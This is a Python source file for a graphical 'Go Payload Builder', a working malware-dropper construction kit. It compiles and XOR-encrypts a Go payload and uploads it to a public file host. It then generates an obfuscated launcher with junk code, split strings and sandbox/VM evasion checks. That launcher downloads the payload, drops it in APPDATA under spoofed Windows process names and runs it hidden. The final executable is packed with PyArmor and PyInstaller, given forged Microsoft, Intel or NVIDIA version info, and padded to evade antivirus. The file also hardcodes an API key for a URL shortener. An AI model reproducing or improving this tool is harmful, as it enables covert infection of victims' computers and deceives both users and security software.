#!/usr/bin/env python3
"""
Go Payload Builder — Pure-Python staging (no PowerShell).
"""
import sys
import os
import base64
import subprocess
import tempfile
import requests
import random
import string
import shutil
import time
import textwrap
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QLabel, QLineEdit,
    QTextEdit, QPushButton, QVBoxLayout, QHBoxLayout, QCheckBox,
    QGroupBox, QGridLayout, QScrollArea, QComboBox, QFileDialog
)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont

DARK_STYLE = """
QMainWindow { background-color: #0d1117; color: #c9d1d9; }
QWidget { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Arial, sans-serif; }
QLabel { color: #c9d1d9; font-size: 13px; padding: 4px; }
QLineEdit { background-color: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 8px; color: #c9d1d9; }
QLineEdit:focus { border: 1px solid #58a6ff; }
QTextEdit { background-color: #161b22; border: 1px solid #30363d; border-radius: 6px; color: #c9d1d9; font-family: Consolas, monospace; }
QCheckBox { color: #c9d1d9; spacing: 6px; }
QCheckBox::indicator { width: 16px; height: 16px; background-color: #161b22; border: 1px solid #30363d; border-radius: 3px; }
QCheckBox::indicator:checked { background-color: #238636; border: 1px solid #2ea043; }
QGroupBox { font-weight: bold; color: #c9d1d9; border: 1px solid #30363d; border-radius: 6px; margin-top: 8px; padding-top: 8px; }
QComboBox { background-color: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 6px; color: #c9d1d9; }
QPushButton { background-color: #238636; color: #ffffff; border: none; border-radius: 6px; padding: 10px 20px; font-weight: bold; }
QPushButton:hover { background-color: #2ea043; }
QPushButton:pressed { background-color: #196c2e; }
"""

# Legitimate-looking drop filenames (pick one at random per build)
DROP_NAMES = [
    "RuntimeBroker", "SearchIndexer", "SecurityHealthService",
    "WmiPrvSE", "CompatTelRunner", "MpCmdRun", "dllhost",
    "conhost", "sihost", "taskhostw", "ctfmon", "fontdrvhost",
    "WUDFHost", "DeviceCensus", "MusNotification",
]


class LitterboxAPI:
    API_URL = "https://litterbox.catbox.moe/resources/internals/api.php"

    def __init__(self, retention="24h", retries=3, delay=5):
        self.retention = retention
        self.retries = retries
        self.delay = delay

    def upload(self, filepath):
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"File not found: {filepath}")

        for attempt in range(self.retries):
            try:
                with open(filepath, 'rb') as f:
                    files = {'fileToUpload': f}
                    data = {'reqtype': 'fileupload', 'time': self.retention}
                    resp = requests.post(self.API_URL, data=data, files=files, timeout=60)
                    resp.raise_for_status()
                    result = resp.text.strip()
                    if result.startswith("http"):
                        return result
                    raise Exception(f"Invalid response: {result}")
            except Exception:
                if attempt < self.retries - 1:
                    time.sleep(self.delay)
                else:
                    raise
        raise Exception("Upload failed")


class Obfuscator:
    @staticmethod
    def generate_key(length=32):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    @staticmethod
    def xor_encode_bytes(data_bytes, key):
        key_bytes = key.encode('utf-8')
        result = bytearray()
        for i, b in enumerate(data_bytes):
            result.append(b ^ key_bytes[i % len(key_bytes)])
        return bytes(result)

    @staticmethod
    def rand_var(prefix="v"):
        return f"_{prefix}{''.join(random.choices(string.ascii_lowercase, k=8))}"

    @staticmethod
    def split_string_to_chunks(s, min_chunk=3, max_chunk=8):
        """Split a string into random-length chunks for concatenation at runtime."""
        chunks = []
        i = 0
        while i < len(s):
            size = random.randint(min_chunk, max_chunk)
            chunks.append(s[i:i + size])
            i += size
        return chunks

    @staticmethod
    def encode_string_as_chr_mix(s):
        """Encode a string as a mix of chr() calls and literal chunks."""
        parts = []
        i = 0
        while i < len(s):
            if random.random() < 0.4:
                parts.append(f"chr({ord(s[i])})")
                i += 1
            else:
                end = min(i + random.randint(2, 5), len(s))
                parts.append(repr(s[i:end]))
                i = end
        return " + ".join(parts)

    @staticmethod
    def generate_junk_lines(count=8):
        """Generate dead-code lines that look like real computations."""
        lines = []
        templates = [
            lambda v: f"{v} = sum(range({random.randint(10,200)}))",
            lambda v: f"{v} = [x * {random.randint(2,9)} for x in range({random.randint(5,30)})]",
            lambda v: f"{v} = {{k: k * {random.randint(2,7)} for k in range({random.randint(3,15)})}}",
            lambda v: f"{v} = len(str({random.randint(100000,999999)}))",
            lambda v: f"{v} = hash(({random.randint(1,999)}, {random.randint(1,999)}))",
            lambda v: f"{v} = {random.randint(1,500)} ** 2 - {random.randint(1,500)}",
            lambda v: f"{v} = bool({random.randint(0,1)})",
            lambda v: f"{v} = list(reversed(range({random.randint(5,20)})))",
        ]
        for _ in range(count):
            v = Obfuscator.rand_var("jnk")
            lines.append(random.choice(templates)(v))
        return lines


class URLShortener:
    @staticmethod
    def shorten(url):
        api = "https://edgqrfijgnyboeymkydu.supabase.co/functions/v1/shorten"
        headers = {
            "Content-Type": "application/json",
            "x-api-key": "listentosmokeforever"
        }
        try:
            resp = requests.post(api, json={"url": url}, headers=headers, timeout=15)
            resp.raise_for_status()
            return resp.json().get("raw_url", url)
        except Exception:
            return url


class GoBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Go Payload Builder")
        self.setMinimumSize(900, 700)
        self.litterbox = LitterboxAPI()

        self.setStyleSheet(DARK_STYLE)

        self.raw_payload = ""
        self.enc_key = ""

        self._init_ui()

    def _init_ui(self):
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)

        title = QLabel("Go Payload Builder")
        title.setAlignment(Qt.AlignCenter)
        title.setFont(QFont("Segoe UI", 20, QFont.Bold))
        title.setStyleSheet("color: #58a6ff; padding: 10px;")
        layout.addWidget(title)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("QScrollArea { border: none; background: transparent; }")

        content = QWidget()
        content_layout = QVBoxLayout()

        # File Selection Group
        file_group = QGroupBox("Payload Source")
        file_layout = QHBoxLayout()

        self.file_label = QLabel("No file selected")
        self.file_label.setStyleSheet("color: #8b949e; font-style: italic;")
        file_layout.addWidget(self.file_label, 1)

        browse_btn = QPushButton("Select Go File")
        browse_btn.clicked.connect(self._browse_file)
        file_layout.addWidget(browse_btn)

        file_group.setLayout(file_layout)
        content_layout.addWidget(file_group)

        # Config Group
        config_group = QGroupBox("Configuration")
        config_layout = QGridLayout()

        config_layout.addWidget(QLabel("Output Filename:"), 0, 0)
        self.output_input = QLineEdit(f"system_update_{random.randint(100,999)}.exe")
        config_layout.addWidget(self.output_input, 0, 1)

        config_layout.addWidget(QLabel("Litterbox Retention:"), 1, 0)
        self.retention_combo = QComboBox()
        self.retention_combo.addItems(["1h", "12h", "24h", "72h"])
        self.retention_combo.setCurrentText("24h")
        config_layout.addWidget(self.retention_combo, 1, 1)

        config_group.setLayout(config_layout)
        content_layout.addWidget(config_group)

        # Options Group
        options_group = QGroupBox("Build Options")
        options_layout = QVBoxLayout()

        self.opt_xor = QCheckBox("XOR Encrypt Payload Binary")
        self.opt_xor.setChecked(True)
        options_layout.addWidget(self.opt_xor)

        self.opt_pyarmor = QCheckBox("Obfuscate with PyArmor")
        self.opt_pyarmor.setChecked(True)
        options_layout.addWidget(self.opt_pyarmor)

        self.opt_hidden = QCheckBox("Hide Window ( --noconsole )")
        self.opt_hidden.setChecked(True)
        options_layout.addWidget(self.opt_hidden)

        self.opt_sandbox = QCheckBox("Sandbox / VM Evasion Checks")
        self.opt_sandbox.setChecked(True)
        options_layout.addWidget(self.opt_sandbox)

        self.opt_versioninfo = QCheckBox("Embed Version Info Manifest")
        self.opt_versioninfo.setChecked(True)
        options_layout.addWidget(self.opt_versioninfo)

        self.opt_padding = QCheckBox("File Size Padding (inflate to ~5 MB)")
        self.opt_padding.setChecked(False)
        options_layout.addWidget(self.opt_padding)

        options_group.setLayout(options_layout)
        content_layout.addWidget(options_group)

        # Log Group
        log_group = QGroupBox("Build Log")
        log_layout = QVBoxLayout()
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setMinimumHeight(200)
        log_layout.addWidget(self.log_output)
        log_group.setLayout(log_layout)
        content_layout.addWidget(log_group)

        # Buttons
        btn_row = QWidget()
        btn_layout = QHBoxLayout(btn_row)

        all_btn = QPushButton("Build All Stages")
        all_btn.setStyleSheet("background-color: #8957e5;")
        all_btn.clicked.connect(self._run_all)
        btn_layout.addWidget(all_btn)

        content_layout.addWidget(btn_row)

        content.setLayout(content_layout)
        scroll.setWidget(content)
        layout.addWidget(scroll)

        main_widget.setLayout(layout)

    def _log(self, msg, level="INFO"):
        prefix = {"INFO": "[*]", "OK": "[+]", "ERR": "[-]", "WARN": "[!]"}[level]
        self.log_output.append(f"{prefix} {msg}")
        self.log_output.verticalScrollBar().setValue(
            self.log_output.verticalScrollBar().maximum()
        )
        QApplication.processEvents()

    def _browse_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Go Payload", "", "Go Files (*.go);;All Files (*)"
        )
        if file_path:
            self.file_label.setText(os.path.basename(file_path))
            self.file_label.setStyleSheet("color: #58a6ff;")
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    self.raw_payload = f.read()
                self._log(f"Loaded payload: {os.path.basename(file_path)}", "OK")
            except Exception as e:
                self._log(f"Failed to read file: {e}", "ERR")

    # ================================================================
    # BUILD PIPELINE
    # ================================================================

    def _run_all(self):
        self.log_output.clear()
        self._log("=== Starting Build Pipeline ===")

        if not self.raw_payload:
            self._log("Please select a payload file first.", "ERR")
            return

        if not self.enc_key:
            self.enc_key = Obfuscator.generate_key()
            self._log(f"Generated XOR Key: {self.enc_key}")

        self.litterbox.retention = self.retention_combo.currentText()

        try:
            # STAGE 1: Compile Go payload, XOR encrypt, upload
            self._log("\n--- Stage 1: Compile & Encrypt Payload ---")
            payload_url = self._stage_compile_payload()

            # STAGE 2: Shorten URL
            self._log("\n--- Stage 2: Shorten Payload URL ---")
            short_url = URLShortener.shorten(payload_url)
            self._log(f"Shortened URL ready", "OK")

            # STAGE 3: Generate obfuscated Python launcher (pure Python, no PS)
            self._log("\n--- Stage 3: Generate Obfuscated Launcher ---")
            script_path, tmpdir = self._stage_generate_launcher(short_url)

            # STAGE 4: PyArmor obfuscation
            final_script = script_path
            if self.opt_pyarmor.isChecked():
                self._log("\n--- Stage 4: PyArmor Obfuscation ---")
                final_script = self._stage_pyarmor(script_path, tmpdir) or script_path

            # STAGE 5: Generate version info manifest
            version_file = None
            if self.opt_versioninfo.isChecked():
                self._log("\n--- Stage 5: Generate Version Manifest ---")
                version_file = self._stage_version_info(tmpdir)

            # STAGE 6: PyInstaller build
            self._log("\n--- Stage 6: PyInstaller Build ---")
            self._stage_pyinstaller(final_script, tmpdir, version_file)

            self._log("\n=== Pipeline Complete ===", "OK")
        except Exception as e:
            self._log(f"Stopped: {e}", "ERR")

    # ----------------------------------------------------------------
    # STAGE 1 — Compile Go payload → XOR encrypt → upload
    # ----------------------------------------------------------------

    def _stage_compile_payload(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            src_path = os.path.join(tmpdir, "payload.go")
            with open(src_path, "w", encoding="utf-8") as f:
                f.write(self.raw_payload)

            self._log("Initializing Go module...")
            subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True)
            subprocess.run(["go", "get", "golang.org/x/sys/windows"], cwd=tmpdir, capture_output=True)
            subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True)

            out_path = os.path.join(tmpdir, "payload.exe")
            env = os.environ.copy()
            env["GOOS"] = "windows"
            env["GOARCH"] = "amd64"
            env["CGO_ENABLED"] = "0"

            self._log("Compiling (GOOS=windows, stripped, windowsgui)...")
            build = subprocess.run(
                ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "payload.go"],
                cwd=tmpdir, capture_output=True, text=True, env=env
            )
            if build.returncode != 0:
                raise Exception(f"Go build failed:\n{build.stderr}")

            with open(out_path, "rb") as f:
                bin_data = f.read()
            self._log(f"Compiled binary: {len(bin_data)} bytes", "OK")

            if self.opt_xor.isChecked():
                bin_data = Obfuscator.xor_encode_bytes(bin_data, self.enc_key)
                self._log("XOR encrypted payload", "OK")

            enc_path = os.path.join(tmpdir, "payload.bin")
            with open(enc_path, "wb") as f:
                f.write(bin_data)

            url = self.litterbox.upload(enc_path)
            self._log("Payload uploaded to staging", "OK")
            return url

    # ----------------------------------------------------------------
    # STAGE 3 — Generate obfuscated pure-Python launcher
    # ----------------------------------------------------------------

    def _stage_generate_launcher(self, payload_url):
        """
        Generates a Python script that:
        - Rebuilds the URL from split chunks (no single scannable string)
        - Rebuilds the XOR key from chr() calls
        - Performs sandbox/VM evasion checks
        - Downloads via urllib (stdlib only)
        - XOR decrypts in memory
        - Drops to AppData with a legit-looking service name
        - Executes with CREATE_NO_WINDOW flag
        - Includes randomized variable names and junk code
        """
        key = self.enc_key

        # Random variable names for every build
        v_url = Obfuscator.rand_var("u")
        v_key = Obfuscator.rand_var("k")
        v_data = Obfuscator.rand_var("d")
        v_dec = Obfuscator.rand_var("r")
        v_path = Obfuscator.rand_var("p")
        v_i = Obfuscator.rand_var("i")
        v_req = Obfuscator.rand_var("q")
        v_resp = Obfuscator.rand_var("s")
        v_info = Obfuscator.rand_var("si")

        # Split URL into chunks, build as concatenation
        url_chunks = Obfuscator.split_string_to_chunks(payload_url)
        url_expr = " + ".join(repr(c) for c in url_chunks)

        # Encode XOR key as chr() mix
        key_expr = Obfuscator.encode_string_as_chr_mix(key)

        # Pick a legit-looking drop filename
        drop_name = random.choice(DROP_NAMES) + ".exe"

        # Junk code
        junk_top = Obfuscator.generate_junk_lines(random.randint(5, 10))
        junk_mid = Obfuscator.generate_junk_lines(random.randint(3, 7))

        # Sandbox evasion block
        sandbox_block = ""
        if self.opt_sandbox.isChecked():
            v_sc = Obfuscator.rand_var("sc")
            v_mc = Obfuscator.rand_var("mc")
            v_up = Obfuscator.rand_var("up")
            v_dt = Obfuscator.rand_var("dt")
            sandbox_block = textwrap.dedent(f"""\
                import multiprocessing as {v_mc}
                import ctypes as {v_sc}
                {v_up} = {v_sc}.windll.kernel32.GetTickCount64() if hasattr({v_sc}, 'windll') else 999999999
                if {v_mc}.cpu_count() < 2:
                    raise SystemExit
                if {v_up} < 600000:
                    raise SystemExit
                {v_dt} = __import__('datetime')
                if ({v_dt}.datetime.now() - {v_dt}.datetime(2020, 1, 1)).days < 100:
                    raise SystemExit
            """)

        # Sleep with random jitter (sandbox timeout evasion)
        sleep_secs = round(random.uniform(1.5, 4.0), 2)

        # Build the launcher script
        script = textwrap.dedent(f"""\
            import os as _os
            import subprocess as _sp
            import time as _tm
            import urllib.request as _ur
            {chr(10).join(junk_top)}
            {sandbox_block}
            _tm.sleep({sleep_secs})
            {chr(10).join(junk_mid)}
            {v_url} = {url_expr}
            {v_key} = {key_expr}
            {v_req} = _ur.Request({v_url})
            {v_req}.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            {v_resp} = _ur.urlopen({v_req}, timeout=30)
            {v_data} = {v_resp}.read()
            {v_dec} = bytearray(len({v_data}))
            for {v_i} in range(len({v_data})):
                {v_dec}[{v_i}] = {v_data}[{v_i}] ^ ord({v_key}[{v_i} % len({v_key})])
            {v_path} = _os.path.join(_os.environ.get("APPDATA", _os.environ.get("TEMP", ".")), "{drop_name}")
            with open({v_path}, "wb") as _f:
                _f.write(bytes({v_dec}))
            {v_info} = _sp.STARTUPINFO()
            {v_info}.dwFlags |= _sp.STARTF_USESHOWWINDOW
            {v_info}.wShowWindow = 0
            _sp.Popen({v_path}, startupinfo={v_info}, creationflags=0x08000000)
        """)

        tmpdir = tempfile.mkdtemp()
        script_path = os.path.join(tmpdir, "launcher.py")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(script)

        self._log(f"Launcher generated ({len(script)} chars, vars randomized)", "OK")
        self._log(f"Drop name: {drop_name}", "INFO")
        if self.opt_sandbox.isChecked():
            self._log("Sandbox evasion checks embedded", "OK")
        return script_path, tmpdir

    # ----------------------------------------------------------------
    # STAGE 4 — PyArmor obfuscation
    # ----------------------------------------------------------------

    def _stage_pyarmor(self, script_path, tmpdir):
        self._log("Running PyArmor obfuscation...")
        obf_dir = os.path.join(tmpdir, "obf")
        res = subprocess.run(
            ["pyarmor", "gen", "-O", obf_dir, script_path],
            capture_output=True, text=True
        )
        if res.returncode != 0:
            self._log(f"PyArmor failed (continuing without): {res.stderr.strip()}", "WARN")
            return None
        self._log("PyArmor obfuscation complete", "OK")
        return os.path.join(obf_dir, "launcher.py")

    # ----------------------------------------------------------------
    # STAGE 5 — Version info manifest
    # ----------------------------------------------------------------

    def _stage_version_info(self, tmpdir):
        """Generate a .txt version resource file for PyInstaller --version-file."""
        output_name = self.output_input.text().strip().replace(".exe", "")
        company_names = [
            "Microsoft Corporation", "Intel Corporation",
            "NVIDIA Corporation", "Realtek Semiconductor Corp.",
            "Synaptics Incorporated", "Qualcomm Technologies, Inc.",
        ]
        descriptions = [
            "System Runtime Broker", "Windows Update Service Helper",
            "Display Configuration Utility", "Network Connectivity Assistant",
            "Hardware Compatibility Telemetry", "Security Health Monitor",
        ]
        company = random.choice(company_names)
        desc = random.choice(descriptions)
        major = random.randint(6, 10)
        minor = random.randint(0, 3)
        patch = random.randint(0, 9999)
        build_n = random.randint(1, 99999)

        version_info = textwrap.dedent(f"""\
            VSVersionInfo(
              ffi=FixedFileInfo(
                filevers=({major}, {minor}, {patch}, {build_n}),
                prodvers=({major}, {minor}, {patch}, {build_n}),
                mask=0x3f,
                flags=0x0,
                OS=0x40004,
                fileType=0x1,
                subtype=0x0,
                date=(0, 0)
              ),
              kids=[
                StringFileInfo([
                  StringTable('040904B0', [
                    StringStruct('CompanyName', '{company}'),
                    StringStruct('FileDescription', '{desc}'),
                    StringStruct('FileVersion', '{major}.{minor}.{patch}.{build_n}'),
                    StringStruct('InternalName', '{output_name}'),
                    StringStruct('LegalCopyright', 'Copyright (C) {company}'),
                    StringStruct('OriginalFilename', '{output_name}.exe'),
                    StringStruct('ProductName', '{desc}'),
                    StringStruct('ProductVersion', '{major}.{minor}.{patch}.{build_n}'),
                  ])
                ]),
                VarFileInfo([VarStruct('Translation', [0x0409, 0x04B0])])
              ]
            )
        """)

        version_path = os.path.join(tmpdir, "version_info.txt")
        with open(version_path, "w", encoding="utf-8") as f:
            f.write(version_info)

        self._log(f"Version info: {desc} by {company} v{major}.{minor}.{patch}", "OK")
        return version_path

    # ----------------------------------------------------------------
    # STAGE 6 — PyInstaller build
    # ----------------------------------------------------------------

    def _stage_pyinstaller(self, final_script, tmpdir, version_file=None):
        output_name = self.output_input.text().strip()
        if not output_name.endswith(".exe"):
            output_name += ".exe"

        cwd = os.getcwd()

        self._log("Running PyInstaller...")

        pyinstaller_args = [
            "pyinstaller",
            "--onefile",
            "--clean",
            "-y",
            "-n", output_name.replace(".exe", ""),
            "--distpath", cwd,
        ]

        if self.opt_hidden.isChecked():
            pyinstaller_args.append("--noconsole")

        if version_file and os.path.exists(version_file):
            pyinstaller_args.extend(["--version-file", version_file])

        pyinstaller_args.append(final_script)

        res = subprocess.run(pyinstaller_args, capture_output=True, text=True, cwd=tmpdir)

        if res.returncode != 0:
            self._log(f"PyInstaller stderr: {res.stderr[-500:]}", "ERR")

        final_exe_path = os.path.join(cwd, output_name)

        # File size padding
        if self.opt_padding.isChecked() and os.path.exists(final_exe_path):
            current = os.path.getsize(final_exe_path)
            target = 5 * 1024 * 1024  # 5 MB
            if current < target:
                pad = target - current
                with open(final_exe_path, "ab") as f:
                    # Write random bytes as overlay (ignored by PE loader)
                    f.write(os.urandom(pad))
                self._log(f"Padded to {target // (1024*1024)} MB (added {pad} bytes overlay)", "OK")

        if os.path.exists(final_exe_path):
            size = os.path.getsize(final_exe_path)
            self._log(f"SUCCESS: {output_name} ({size:,} bytes)", "OK")
        else:
            self._log("EXE not found after build. Check AV quarantine.", "ERR")

        # Cleanup tmpdir
        try:
            shutil.rmtree(tmpdir, ignore_errors=True)
        except Exception:
            pass


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = GoBuilder()
    window.show()
    sys.exit(app.exec_())
